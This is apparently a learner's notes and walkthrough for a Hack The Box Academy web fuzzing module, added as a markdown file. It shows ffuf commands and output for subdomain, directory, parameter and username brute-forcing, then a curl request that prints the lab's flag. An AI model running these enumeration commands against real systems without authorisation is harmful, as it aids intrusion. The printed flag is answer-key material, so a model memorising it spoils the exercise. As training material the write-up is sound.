@@ -1,0 +1,211 @@
+# Attacking Web Applications with Ffuf
+
+### What I learned
+
+- Directory fuzzing with ffuf is very easy and useful, for example with `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://94.237.121.111:54430/FUZZ` I was able to find to pages forum and blog which may contain something to move forward.
+- Similar as above logic applyes to fuzzing for files in a directory for example `/blog` `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://94.237.51.160:51933/blog/FUZZ.php` 
+- You can set depth for scan which will scan all sub directories inside the folder. You can specify depth with `-recursion` and then`-recursion-depth 1`
+- Subdomain fuzzing can be performed simply by moving `FUZZ` a bit one example `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.inlanefreight.com`
+### What I did not understood at first
+
+- That it is important to chane and write in `/etc/hosts` for local DNS override as sometimes it wont work without it as computer does not know where are you heading.
+
+### What i would do differently
+
+- Try different word lists especially larger ones
+# Skills Assessment - Web Fuzzing
+
+- First thing I'm doing is adding academy.htb to my DNS records
+```bash
+echo "83.136.251.11 academy.htb" | sudo tee -a /etc/hosts
+```
+
+1. As Hack The Box straight tell to use vhost fuzzing I do and find  3 subdomains
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://83.136.251.11:38901/" -H "Host: FUZZ.academy.htb" -fs 985  
+  
+       /'___\  /'___\           /'___\          
+      /\ \__/ /\ \__/  __  __  /\ \__/          
+      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
+       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
+        \ \_\   \ \_\  \ \____/  \ \_\          
+         \/_/    \/_/   \/___/    \/_/          
+  
+      v2.1.0-dev  
+________________________________________________  
+  
+:: Method           : GET  
+:: URL              : http://83.136.251.11:38901/  
+:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  
+:: Header           : Host: FUZZ.academy.htb  
+:: Follow redirects : false  
+:: Calibration      : false  
+:: Timeout          : 10  
+:: Threads          : 40  
+:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
+:: Filter           : Response size: 985  
+________________________________________________  
+  
+test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 80ms]  
+archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 78ms]  
+faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 80ms]  
+:: Progress: [4989/4989] :: Job [1/1] :: 502 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
+```
+
+2. Looked for extensions and found 3 `.php` `.phps` and `.php7` 
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u "http://faculty.academy.htb:38901/indexFUZZ"  
+  
+       /'___\  /'___\           /'___\          
+      /\ \__/ /\ \__/  __  __  /\ \__/          
+      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
+       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
+        \ \_\   \ \_\  \ \____/  \ \_\          
+         \/_/    \/_/   \/___/    \/_/          
+  
+      v2.1.0-dev  
+________________________________________________  
+  
+:: Method           : GET  
+:: URL              : http://faculty.academy.htb:38901/indexFUZZ  
+:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/web-extensions.txt  
+:: Follow redirects : false  
+:: Calibration      : false  
+:: Timeout          : 10  
+:: Threads          : 40  
+:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
+________________________________________________  
+  
+.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3389ms]  
+.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 3391ms]  
+.php7                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4396ms]  
+:: Progress: [43/43] :: Job [1/1] :: 9 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+```
+
+3. Fuzzed for directories and found `linux-security.php7`
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ \    
+ -u http://faculty.academy.htb:38901/FUZZ \  
+ -recursion \  
+ -fc 404,403 \  
+ -fs 0 -e .php7  
+  
+       /'___\  /'___\           /'___\          
+      /\ \__/ /\ \__/  __  __  /\ \__/          
+      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
+       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
+        \ \_\   \ \_\  \ \____/  \ \_\          
+         \/_/    \/_/   \/___/    \/_/          
+  
+      v2.1.0-dev  
+________________________________________________  
+  
+:: Method           : GET  
+:: URL              : http://faculty.academy.htb:38901/FUZZ  
+:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt  
+:: Extensions       : .php7    
+:: Follow redirects : false  
+:: Calibration      : false  
+:: Timeout          : 10  
+:: Threads          : 40  
+:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
+:: Filter           : Response status: 404,403  
+:: Filter           : Response size: 0  
+________________________________________________  
+  
+courses                 [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 79ms]  
+[INFO] Adding a new job to the queue: http://faculty.academy.htb:38901/courses/FUZZ  
+  
+[INFO] Starting queued job on target: http://faculty.academy.htb:38901/courses/FUZZ  
+  
+linux-security.php7     [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 80ms]  
+:: Progress: [175328/175328] :: Job [2/2] :: 244 req/sec :: Duration: [0:07:55] :: Errors: 58731 ::
+```
+4. Fuzzed for parameters of `linux-security.php7` and found `user` and `username`
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \                                                                                                  
+ -u http://faculty.academy.htb:38364/courses/linux-security.php7 \  
+ -X POST \  
+ -H "Content-Type: application/x-www-form-urlencoded" \  
+ -d "FUZZ=value" \  
+ -fs 774  
+  
+  
+       /'___\  /'___\           /'___\          
+      /\ \__/ /\ \__/  __  __  /\ \__/          
+      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
+       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
+        \ \_\   \ \_\  \ \____/  \ \_\          
+         \/_/    \/_/   \/___/    \/_/          
+  
+      v2.1.0-dev  
+________________________________________________  
+  
+:: Method           : POST  
+:: URL              : http://faculty.academy.htb:38364/courses/linux-security.php7  
+:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  
+:: Header           : Content-Type: application/x-www-form-urlencoded  
+:: Data             : FUZZ=value  
+:: Follow redirects : false  
+:: Calibration      : false  
+:: Timeout          : 10  
+:: Threads          : 40  
+:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
+:: Filter           : Response size: 774  
+________________________________________________  
+  
+user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 80ms]  
+username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 79ms]  
+:: Progress: [6453/6453] :: Job [1/1] :: 501 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
+```
+
+5. Now I was looking for usernames and found `harry`
+```bash
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ \  
+ -u http://faculty.academy.htb:38364/courses/linux-security.php7 \  
+ -X POST \  
+ -H "Content-Type: application/x-www-form-urlencoded" \  
+ -d "username=FUZZ" \  
+ -fs 781  
+  
+       /'___\  /'___\           /'___\          
+      /\ \__/ /\ \__/  __  __  /\ \__/          
+      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
+       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
+        \ \_\   \ \_\  \ \____/  \ \_\          
+         \/_/    \/_/   \/___/    \/_/          
+  
+      v2.1.0-dev  
+________________________________________________  
+  
+:: Method           : POST  
+:: URL              : http://faculty.academy.htb:38364/courses/linux-security.php7  
+:: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
+:: Header           : Content-Type: application/x-www-form-urlencoded  
+:: Data             : username=FUZZ  
+:: Follow redirects : false  
+:: Calibration      : false  
+:: Timeout          : 10  
+:: Threads          : 40  
+:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
+:: Filter           : Response size: 781  
+________________________________________________  
+  
+harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 79ms]  
+Harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 80ms]  
+HARRY                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 79ms]
+```
+
+6. And finally I can grab a flag using curl post request
+```bash
+curl http://faculty.academy.htb:38364/courses/linux-security.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'  
+<div class='center'><p>HTB{w3b_fuzz1n6_m4573r}</p></div>  
+<html>  
+<!DOCTYPE html>  
+  
+<head>  
+ <title>HTB Academy</title>  
+ <style>  
+   *,
+<...SNIP...>
+```
